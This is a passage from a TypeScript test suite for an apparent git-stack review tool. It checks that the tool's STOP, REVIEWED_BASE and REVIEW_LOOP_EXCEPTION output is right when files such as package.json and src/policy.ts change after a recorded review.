    const merge = () => {
      f.git('fetch', '-q', 'origin');
      expect(f.git('merge', '-q', '--no-edit', '-X', 'theirs', 'origin/main').status).toBe(0);
      if (landed && state === 'fold' && f.git('cat-file', '-e', `HEAD:${FRAGMENT}`).status === 0) {
        expect(f.git('rm', '-q', FRAGMENT).status).toBe(0);
        expect(f.git('commit', '-q', '--amend', '--no-edit').status).toBe(0);
      }
      return head(f);
    };
    const fixUp = () => { f.write({ 'src/child.ts': 'export const c = 2;\n' }); f.commit('fix after the merge'); return head(f); };
    if (order === 'before') { heads.merge = merge(); heads.post = fixUp(); land(); merge(); }
    if (order === 'after') { land(); heads.merge = merge(); heads.post = fixUp(); }
    if (order === 'never') land();
    f.write({ 'src/child.ts': 'export const c = 3;\n', 'src/other.ts': lines(5, { 2: 'export const l2 = 20;', 4: 'export const l4 = 40;' }),
      ...(probes ? { 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n', 'src/policy.ts': ALLOW + 'export const KEY_VERSION = 2;\n' } : {}) });
    f.commit('edits after the fix-check');
    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: heads[at], findings: 0 } });
    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
    return { r, parent, stop: lineOf(r.stdout, 'STOP'), base: lineOf(r.stdout, 'REVIEWED_BASE'), loop: lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION') };
  }

  test.each(cells)('merged %s the landing × parent %s × fix-check head %s', (order, state, at) => {
    const notLanded = ['', expect.stringContaining('nor a landed stack parent')];
    const probe = cell(order, state, at, true);
    expect(probe.r.status).toBe(3);
    if (order === 'never' || state !== 'edited') expect([probe.base, probe.stop]).toEqual(notLanded);
    else {
      expect(probe.base).toContain(`stack parent ${probe.parent.slice(0, 12)} landed`);
      expect(probe.loop).toStartWith('REVIEW_LOOP_EXCEPTION: accepted src/child.ts (');
      expect(probe.stop).toStartWith('STOP: behavior, tests or build inputs changed since review (');
      for (const p of ['package.json', 'src/other.ts', 'src/policy.ts']) expect(probe.stop).toContain(p);
    }
    const control = cell(order, state, at, false);
    expect(control.r.status).toBe(3);
    if (order === 'never' || state === 'unlanded') { expect([control.base, control.stop]).toEqual(notLanded); return; }
    expect(control.base).toContain(`stack parent ${control.parent.slice(0, 12)} landed`);
    expect([control.loop, control.stop]).toEqual([expect.stringMatching(/^REVIEW_LOOP_EXCEPTION: accepted src\/child\.ts \(/), behaviorStop('src/other.ts')]);
  });
});
